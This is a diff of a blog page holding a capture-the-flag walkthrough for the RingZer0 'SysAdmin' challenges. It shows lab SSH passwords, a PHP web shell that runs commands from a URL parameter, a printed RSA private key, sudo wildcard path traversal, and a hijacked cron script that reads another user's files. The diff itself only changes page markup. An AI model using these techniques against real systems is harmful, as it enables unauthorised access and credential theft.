@@ -26,7 +26,7 @@ $ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13
 
 
 
-<meta name="generator" content="Hugo 0.75.1" />
+<meta name="generator" content="Hugo 0.89.4" />
 
 <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
 <style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
@@ -42,6 +42,10 @@ $ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13
 <link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
 <link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
 
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
 
 
 <link rel="icon" 
@@ -87,7 +91,7 @@ type="image/x-icon"/>
   </p>
   <div class="lh-copy post-content"><h2 id="sysadmin-part-1">SysAdmin Part 1</h2>
 <p>Let&rsquo;s login to the machine:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
 
          _                             ____  __                     
    _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
@@ -105,7 +109,7 @@ You have mail.
 morpheus@forensics:~$ 
 
 </code></pre></div><p>What&rsquo;s in $HOME:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ls  -l
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ls  -l
 total 4
 -rw-r----- 1 root root 1655 Mar 10  2014 egrep
 morpheus@forensics:~$ ls -la
@@ -119,7 +123,7 @@ lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -&gt; /dev/null
 -rw-r-----  1 morpheus morpheus  675 Mar  9  2014 .profile
 -rw-r-----  1 morpheus morpheus   19 Mar  9  2014 .vimrc
 </code></pre></div><p>Nothing interesting. What about running processes?</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ps -ax
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:~$ ps -ax
  2615 ?        S      0:00 logger -t mysqld -p daemon.error
  2695 ?        Ss     0:12 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 105:108
  3110 ?        Ssl    0:00 /usr/sbin/slapd -h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d
@@ -145,7 +149,7 @@ lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -&gt; /dev/null
 </code></pre></div><p>Ah, there we go.</p>
 <h2 id="sysadmin-part-2">SysAdmin Part 2</h2>
 <p>Now let&rsquo;s login with <code>trinity</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
 
          _                             ____  __                     
    _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
@@ -162,7 +166,7 @@ lrwxrwxrwx  1 root     root        9 Mar  9  2014 .bash_history -&gt; /dev/null
 You have mail.
 
 </code></pre></div><p>Now let&rsquo;s have a look inside <code>/etc</code> for files containing <strong>architect</strong>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:/etc$ grep -r &#34;architect&#34; 2&gt;/dev/null | head -n 10
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:/etc$ grep -r &#34;architect&#34; 2&gt;/dev/null | head -n 10
 fstab:#//TheMAtrix/phone  /media/Matrix  cifs  username=architect,password=$(base64 -d &#34;RkxBRy14QXFXMnlKZzd4UERCV3VlVGdqd05jMW5WWQo=&#34;),iocharset=utf8,sec=ntlm  0  0
 init.d/checkroot.sh:            # fail on older kernels on sparc64/alpha architectures due
 aide/aide.conf.d/10_aide_hostname:if [ -n &#34;$(dpkg --print-architecture)&#34; ]; then
@@ -176,7 +180,7 @@ FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY
 </code></pre></div><p>Ok, next level.</p>
 <h2 id="sysadmin-part-3">SysAdmin Part 3</h2>
 <p>Let&rsquo;s search for <strong>readable</strong> files and <strong>owned</strong> by the user <strong>architect</strong>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ architect@forensics:/$ find . -readable -and -user architect 2&gt;/dev/null | head -n 10
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ architect@forensics:/$ find . -readable -and -user architect 2&gt;/dev/null | head -n 10
 ./var/mail/architect
 ./var/www/index.php
 ./dev/pts/1
@@ -187,8 +191,8 @@ FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY
 ./proc/11081/task/11081/attr
 ...
 </code></pre></div><p>Hmm, <code>/var/www/index.php</code> looks interesting:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">architect@forensics:/<span style="color:#a61717;background-color:#e3d2d2">$</span> cat /<span style="color:#6ab825;font-weight:bold">var</span>/www/index.php  | head -n <span style="color:#3677a9">20</span>
-&lt;?php
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">architect@forensics:/$ cat /var/www/index.php  | head -n 20
+<span style="color:#cd2828;font-weight:bold">&lt;?php</span>
 <span style="color:#6ab825;font-weight:bold">if</span>(isset(<span style="color:#40ffff">$_GET</span>[<span style="color:#ed9d13">&#39;cmd&#39;</span>])) {
   <span style="color:#40ffff">$res</span> = shell_exec(urldecode(<span style="color:#40ffff">$_GET</span>[<span style="color:#ed9d13">&#39;cmd&#39;</span>]));
   print_r(str_replace(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, <span style="color:#ed9d13">&#39;&lt;br /&gt;&#39;</span>, <span style="color:#40ffff">$res</span>));
@@ -210,7 +214,7 @@ FLAG-xAqW2yJg7xPDBWueTgjwNc1nVY
         }
 ...
 </code></pre></div><p>Ah, some credentials for a <strong>MySQL</strong> DB. Let&rsquo;s have a look:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ mysql -h localhost -u arch -p
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ mysql -h localhost -u arch -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 66
@@ -256,7 +260,7 @@ mysql&gt; select * from flag;
 1 row in set (0.00 sec)
 </code></pre></div><h2 id="sysadmin-part-4">SysAdmin Part 4</h2>
 <p>I first had a look about all <strong>readable</strong> files (to user <strong>architect</strong>) and searched for <code>oracle</code> inside them:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ find / -readable -exec grep -i &#34;oracle&#34; {} \; 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">architect@forensics:~$ find / -readable -exec grep -i &#34;oracle&#34; {} \; 2&gt;/dev/null
 Binary file /backup/c074fa6ec17bb35e168366c43cf4cd19 matches
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics
@@ -264,7 +268,7 @@ Binary file /var/cache/apt-show-versions/apackages matches
 Binary file /var/cache/man/index.db matches
 ...
 </code></pre></div><p>Inside <code>/backup/c074fa6ec17bb35e168366c43cf4cd19</code> we can then find:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
 ----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
 WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
@@ -294,7 +298,7 @@ iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
 -----END RSA PRIVATE KEY-----
 [...]
 </code></pre></div><p>&hellip; which is most probably a private ssh key. Next I try to login to the machine using the previously find SSH identity:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ssh -i ssh oracle@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% ssh -i ssh oracle@for01.ringzer0team.com -p 13375
 
          _                             ____  __                     
    _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
@@ -310,7 +314,7 @@ iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
 
 You have mail.
 </code></pre></div><p>Bingo! Now let&rsquo;s look around:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ ls -la
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ ls -la
 total 36
 drwxr-x---  3 oracle oracle 4096 Mar 12  2014 .
 drwxr-xr-x 10 root   root   4096 Jun 12  2014 ..
@@ -328,7 +332,7 @@ oracle@forensics:~$ cat flag.txt | base64 -d
 FLAG-GIGs1Wq6V6SsZ9h4aQgpGgdbdP
 </code></pre></div><h2 id="sysadmin-part-5">SysAdmin Part 5</h2>
 <p>SSH into machine:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a61717;background-color:#e3d2d2">$</span> ssh -i ssh oracle<span style="color:#a61717;background-color:#e3d2d2">@</span>for01.ringzer0team.com -p <span style="color:#3677a9">13375</span>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a61717;background-color:#e3d2d2">$</span> ssh -i ssh oracle<span style="color:#a61717;background-color:#e3d2d2">@</span>for01.ringzer0team.com -p <span style="color:#3677a9">13375</span>
 oracle<span style="color:#a61717;background-color:#e3d2d2">@</span>forensics:<span style="color:#a61717;background-color:#e3d2d2">~$</span> cat .bashrc 
 <span style="color:#a61717;background-color:#e3d2d2">#</span> <span style="color:#a61717;background-color:#e3d2d2">~</span>/.bashrc: executed by <span style="color:#447fcf">bash</span>(<span style="color:#3677a9">1</span>) <span style="color:#6ab825;font-weight:bold">for</span> non-login shells.
 <span style="color:#a61717;background-color:#e3d2d2">#</span> see /usr/share/doc/bash/examples/startup-<span style="color:#447fcf">files</span> (in the <span style="color:#6ab825;font-weight:bold">package</span> bash-doc)
@@ -434,13 +438,13 @@ fi
 <span style="color:#a61717;background-color:#e3d2d2">#</span> this, <span style="color:#6ab825;font-weight:bold">if</span> it<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s already enabled in /etc/bash.bashrc and /etc/profile
 <span style="color:#a61717;background-color:#e3d2d2">#</span> sources /etc/bash.bashrc).
 </code></pre></div><p>Do you see sth suspicious? No? Well, I do!</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alias reveal=&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">alias reveal=&#34;openssl enc -aes-256-cbc -a -d -in encflag.txt.enc -k &#39;lp6PWgOwDctq5Yx7ntTmBpOISc&#39;&#34;
 </code></pre></div><p>Let&rsquo;s decrypt the file:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ reveal
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">oracle@forensics:~$ reveal
 FLAG-IaFOjjFWazycSg0lbVO3T8ZTvz
 </code></pre></div><h2 id="sysadmin-part-6">SysAdmin Part 6</h2>
 <p>Login as <code>trinity</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sshpass -p Flag-08grILsn3ekqhDK7cKBV6ka8B ssh trinity@for01.ringzer0team.com -p 13375
 
 trinity@forensics:~$ ls -la
 total 28
@@ -453,7 +457,7 @@ lrwxrwxrwx  1 root    root       9 Mar  9  2014 .bash_history -&gt; /dev/null
 -rwxr--r--  1 trinity trinity  675 Dec 10  2015 .profile
 -rwxr-----  1 trinity trinity   23 Jul  5 16:50 .vimrc
 </code></pre></div><p>Obviously only <code>neo:neo</code> can read <code>phonebook</code>. Now let&rsquo;s check for <code>sudo</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -l
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -l
 [sudo] password for trinity:
 Matching Defaults entries for trinity on this host:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, insults
@@ -461,7 +465,7 @@ Matching Defaults entries for trinity on this host:
 User trinity may run the following commands on this host:
     (neo) /bin/cat /home/trinity/*
 </code></pre></div><p>Now read the files:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/*
 The Oracle        1800-133-7133
 Persephone        345-555-1244
 
@@ -472,7 +476,7 @@ Persephone        345-555-1244
 copy made by Cypher copy utility on /home/neo/phonebook
 </code></pre></div><p>Hmmm, nothing special about it. However, you can use the wildcard to go into the parent directory and
 finally into <code>/home/neo/</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">trinity@forensics:~$ sudo -u neo /bin/cat /home/trinity/../neo/phonebook
 The Oracle        1800-133-7133
 Persephone        345-555-1244
 
@@ -483,7 +487,7 @@ change my current password FLAG-lRGLKGh2895wIAoOvcBbgk4oL
 don&#39;t forget to remove this :)
 </code></pre></div><p>Fail :)</p>
 <h2 id="sysadmin-part-7">SysAdmin Part 7</h2>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p FLAG-lRGLKGh2895wIAoOvcBbgk4oL ssh neo@for01.ringzer0team.com -p 13375
 
          _                             ____  __                     
    _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
@@ -500,7 +504,7 @@ don&#39;t forget to remove this :)
 You have mail.
 neo@forensics:~$ 
 </code></pre></div><p>Let&rsquo;s have a look at running processes:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ ps fl -u neo  
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ ps fl -u neo  
 F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
 4  1003 32505 32503  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
 4  1003 32073 32071  20   0   3944   256 -      Ss   ?          0:01 /bin/monitor
@@ -513,7 +517,7 @@ F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
 </code></pre></div><p>Since we can read <code>/bin/monitor</code> as user <code>neo</code> (and <code>/bin/monitor</code> was started using
 <code>sudo neo -c /bin/monitor</code>) we should be able to <strong>trace</strong> its syscalls (since we are
 allowed to attach to a process running as user <code>neo</code>):</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ strace -p32505
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">neo@forensics:~$ strace -p32505
 Process 32505 attached - interrupt to quit
 restart_syscall(&lt;... resuming interrupted call ...&gt;) = 0
 write(4294967295, &#34;telnet 127.0.0.1 23\n&#34;, 20) = -1 EBADF (Bad file descriptor)
@@ -526,7 +530,7 @@ rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
 nanosleep({10, 0},
 </code></pre></div><p>Bingo! The flag is <code>FLAG-a4UVY5HJQO5ddLc5wtBps48A3</code>.</p>
 <h2 id="sysadmin-part-8">SysAdmin Part 8</h2>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">% sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh morpheus@for01.ringzer0team.com -p 13375
 
          _                             ____  __                     
    _____(_)___  ____ _____  ___  _____/ __ \/ /____  ____ _____ ___ 
@@ -543,7 +547,7 @@ nanosleep({10, 0},
 You have mail.
 </code></pre></div><p>I remember some information related to the user <code>cypher</code> during the previous challanges. In fact
 I think I&rsquo;ve seen sth in the files located at <code>/backups</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cp /backup/* .
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cp /backup/* .
 morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
 morpheus@forensics:/var/tmp/bk$ for i in *; do tar -xf $i; done
 morpheus@forensics:/var/tmp/bk$ ls -ltR
@@ -597,7 +601,7 @@ total 0
 total 4
 -rwxr-xr-x 1 morpheus morpheus 54 Mar 12  2014 Gathering.py
 </code></pre></div><p>As you can see there is user cronjob:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cat ./var/spool/cron/crontabs/cypher
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ cat ./var/spool/cron/crontabs/cypher
 # DO NOT EDIT THIS FILE - edit the master and reinstall.
 # (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
 # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
@@ -626,7 +630,7 @@ total 4
 */3 * * * * python /tmp/Gathering.py
 </code></pre></div><p>So every 3 minutes <code>python /tmp/Gathering.py</code> gets executed. If we look closer, we&rsquo;ll
 notice that the Python file is executed as user <code>cypher</code>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ grep -r &#34;cypher&#34; *
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ grep -r &#34;cypher&#34; *
 Binary file 3dab3277410dddca016834f91d172027 matches
 Binary file 776d27d2a429e63bbc3cb29183417bb2 matches
 Binary file ca584b15ae397a9ad45b1ff267b55796 matches
@@ -639,7 +643,7 @@ var/log/syslog:Mar 12 22:06:01 forensics /USR/SBIN/CRON[1857]: (cypher) CMD (pyt
 var/log/syslog:Mar 12 22:09:01 forensics /USR/SBIN/CRON[2269]: (cypher) CMD (python /tmp/Gathering.py)
 </code></pre></div><p>Finally we want the Python script to read all files under <code>/home/cypher/*</code> and redirect the STDOUT
 to some file:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ touch /tmp/gather.log
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp/bk$ touch /tmp/gather.log
 morpheus@forensics:/var/tmp/bk$ chmod 777 /tmp/gather.log
 morpheus@forensics:/var/tmp/bk$ cat /tmp/Gathering.py
 import os
@@ -647,10 +651,10 @@ os.system(&#34;cat /home/cypher/*.* &gt; /tmp/gather.log&#34;)
 </code></pre></div><p>This should do the trick. Now we&rsquo;ll have to wait for the script to get executed. Every 3 minutes means that
 the cronjob will run at following minutes: :00, :03, :06, :09, :12, :15, :18, :21, :24, :27, :30, :33, :36, :39, :42, :45, :48, :51, :54, :57.</p>
 <p>Now wait some time till you see:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ ls -l /tmp/gather.log
 -rwxrwxrwx 1 cypher cypher 8256 Nov 11 06:10 /tmp/gather.log
 </code></pre></div><p>Now let&rsquo;s get the content:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ cat /tmp/gather.log
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">morpheus@forensics:/var/tmp$ cat /tmp/gather.log
 python /tmp/Gathering.py &amp;
 sleep 5
 echo &#34;import os&#34; &gt; /tmp/Gathering.py
@@ -661,7 +665,7 @@ BASE ?
 RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
 ...
 </code></pre></div><p>And the flag is:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo &#34;RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=&#34; | base64 -d
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ echo &#34;RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=&#34; | base64 -d
 FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
 </code></pre></div><p>Now I can also see why I had troubles executing my python script: <code>/tmp/Gathering.py</code> is being executed and then after 5 seconds
 the content of the file gets replaced.</p>
@@ -787,6 +791,13 @@ if (document.getElementById("contents-list") !== null && document.getElementsByC
 
 
 
+
+
+<script>
+ var glightbox = GLightbox({
+     selector: '.glightbox'
+ });
+</script>
 
   
 </body>
